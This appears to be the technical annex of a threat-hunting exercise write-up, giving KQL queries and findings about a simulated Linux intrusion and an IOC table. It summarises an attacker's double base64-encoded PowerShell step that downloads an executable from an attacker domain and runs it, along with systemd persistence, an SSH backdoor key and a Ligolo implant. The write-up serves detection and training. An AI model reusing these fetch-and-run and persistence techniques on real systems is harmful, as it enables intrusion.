**Finding:** `sftp-server`

`LinuxFile_CL` showed that `/tmp/helix-sync` (00:00:48 UTC) and `/tmp/hbsync.exe` (00:11:43 UTC) were both written by `/usr/lib/openssh/sftp-server` — the OpenSSH SFTP subsystem. This confirms `sancadmin` used SFTP over the TKT-003 SSH session to silently stage both binaries before any interactive shell commands appeared.

```kql
LinuxFile_CL
| where TimeGenerated between (datetime(2026-04-30 23:39:00) .. datetime(2026-05-01 00:30:00))
| where DvcHostname == "GF-DEV01"
| where EventType == "FileCreated"
| extend ActingProcessName = tostring(split(ActingProcessFilePath, "/")[-1])
| where ActingProcessName == "sftp-server"
| project TimeGenerated, ActorUsername, ActingProcessName,
    ActingProcessFilePath, TargetFilePath
| order by TimeGenerated asc
```

---

## 🚩 Q39 — Payload Decoding

**Finding:** `https://sync.abordsecurity.space/helix-build-agent.exe, $env:TEMP\hbsync.exe`

The `pwsh` command at 00:18:06 UTC contained a WinRM ScriptBlock targeting GF-WS01 (`10.1.0.133:5985`) with a double base64-encoded payload (UTF-16LE outer, standard base64 inner). Full decode chain:

1. Outer: base64 `-enc` (UTF-16LE) → PowerShell script
2. Inner: `[Convert]::FromBase64String()` → URL
3. URL: `https://sync.abordsecurity.space/helix-build-agent.exe`
4. Destination: `$env:TEMP\hbsync.exe`
5. Action: `Net.WebClient.DownloadFile(url, path)` → `Start-Process`
6. Result: `rc=1` — WinRM failed, payload never delivered

```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-05-01 00:18:00) .. datetime(2026-05-01 00:19:00))
| where ShellUser == "sancadmin"
| where Command contains "pwsh"
| project TimeGenerated, ReturnCode, Command
```

---

## 🚩 Q40 — Phase Analysis

**Finding:** `persistence`

`sancadmin`'s shell history divides into two phases. Phase 1 (23:59–00:08 UTC) was entirely focused on establishing persistence via systemd before attempting anything else. Phase 2 (00:09–00:21 UTC) shows the lateral movement fallback — all of which failed.

```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-04-30 23:39:00) .. datetime(2026-05-01 00:30:00))
| where ShellUser == "sancadmin"
| extend Phase = case(
    TimeGenerated < datetime(2026-05-01 00:09:00), "Phase 1 - Persistence",
    "Phase 2 - Lateral Movement Fallback")
| project TimeGenerated, Phase, Command, ReturnCode
| order by TimeGenerated asc
```

---

## 🚩 Q41 — End-of-Shift Artefact State

**Finding:** `authorized_keys:persistent, helix-sync:dormant, helix-update:running`

Three artefacts left behind on GF-DEV01, each in a different system layer:

| Artefact | State | Layer | Detail |
|---|---|---|---|
| `authorized_keys` | **Persistent** | File | SSH backdoor key (`octotempest@operator`) survives reboots and password resets |
| `helix-sync` | **Dormant** | Service | Registered systemd service, enabled but not confirmed running |
| `helix-update` | **Running** | Process | PID 34616, PPID 1, active since 21:54 UTC |

```kql
// helix-update: confirm still running
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-04-30 21:54:50) .. datetime(2026-05-01 04:00:00))
| where DvcHostname == "GF-DEV01"
| where TargetProcessCommandLine == "/tmp/helix-update"
| project TimeGenerated, TargetProcessId, ActingProcessId, TargetProcessCommandLine

// helix-sync: confirm service registered
Syslog
| where TimeGenerated between (datetime(2026-04-30 21:00:00) .. datetime(2026-05-01 04:00:00))
| where HostName == "GF-DEV01"
| where SyslogMessage contains "helix-sync"
| project TimeGenerated, SyslogMessage
| order by TimeGenerated asc

// authorized_keys: confirm SSH backdoor written
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-04-30 22:55:00) .. datetime(2026-04-30 23:00:00))
| where DvcHostname == "GF-DEV01"
| where TargetProcessCommandLine contains "authorized_keys"
| project TimeGenerated, ActorUsername, TargetProcessCommandLine
```

---

## 📌 IOC Summary

| Type | Value | Context |
|---|---|---|
| Domain | `sync.abordsecurity.space` | C2 / payload delivery (Cloudflare-fronted) |
| Domain | `dl.abordsecurity.space` | Installer dropper domain |
| IP | `104.21.57.185` | Cloudflare CDN — C2 front |
| IP | `104.16.11.34` | Cloudflare CDN — C2 front |
| IP | `194.36.110.139` | Operator SSH ingress (AS9009/M247) |
| IP:Port | `194.36.110.139:9080` | Secondary C2 / payload server |
| File | `/tmp/helix-update` | Ligolo implant (initial) |
| File | `/usr/local/bin/helix-sync` | Ligolo implant (persistent) |
| File | `/tmp/hbsync.exe` | Windows payload (staged, not delivered) |
| File | `/tmp/wmi_exec.py` | WMI lateral movement script |
| SSH Key | `octotempest@operator` | Operator attribution marker |
| Credential | `greenfield.local\t.harris` | Stolen domain account |
| Malware Sig | `HackTool:Linux/Ligolo.A!MTB` | MDC agentless detection |

---

*Technical Annex — Ghost in the Stack | GF-INC-2026-0517*  
*Analyst: Peter Gergely | [LinkedIn](https://www.linkedin.com/in/peter-g-03846161/) | [GitHub](https://github.com/petergergely-grc)*
